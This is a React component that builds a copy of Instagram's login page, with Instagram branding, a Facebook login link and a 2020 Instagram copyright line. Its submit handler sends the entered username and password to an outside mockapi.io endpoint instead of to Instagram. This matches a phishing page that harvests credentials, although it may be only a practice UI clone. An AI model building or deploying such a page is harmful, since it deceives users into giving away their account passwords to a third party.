import './App.css';
import React, { useState } from "react";
import axios from "axios";

function App() {
  const [AddUserdata, setAddUserdata] = useState({
    username: '',
    password: ''
    }
      
    );     

  const handleChange =  (e) => {

      setAddUserdata({

      ...AddUserdata,[e.target.name]:e.target.value
    
  })
  }

  const handleSubmit = async (e) => {
    e.preventDefault();

    const{ username ,password} =AddUserdata
    if(username && password ){
   const result = await axios.post(
  "https://6ac88a8dfd7c536b1bd94092.mockapi.io/UserApi/Userlogin",
  AddUserdata
);
    } else{
        alert("invalid")
    }
  };

  return (
    <div>
     




        <main className="flex align-items-center justify-content-center">
        <section id="mobile" className="flex">
        </section>
        <section id="auth" className="flex direction-column">
          <div className="panel login flex direction-column">
            <h1 title="Instagram" className="flex justify-content-center">
                    <img src="/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form>
                    <label htmlFor="email" className="sr-only">Phone number, username, or email</label>
                    <input name="username" value={AddUserdata.username} onChange={handleChange} placeholder="Phone number, username, or email" />

                    <label htmlFor="password" className="sr-only">Password</label>
                    <input name="password" type="password" value={AddUserdata.password} onChange={handleChange} placeholder="Password" />

                    <button type="button" onClick={handleSubmit}>Log in</button>
                </form>
                <div className="flex separator align-items-center">
                    <span></span>
                    <div className="or">OR</div>
                    <span></span>
                </div>
                <div className="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div className="panel register flex justify-content-center">
                <p>Don’t have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div className="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div className="flex justify-content-center">
                    <img src="/apple-button.png"      alt="Apple App Store logo" title="Apple App Store logo" />
                    <img src="/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        
        <p className="copyright">© 2020 Instagram from Facebook</p>
    </footer>
    </div>
  );
}

export default App;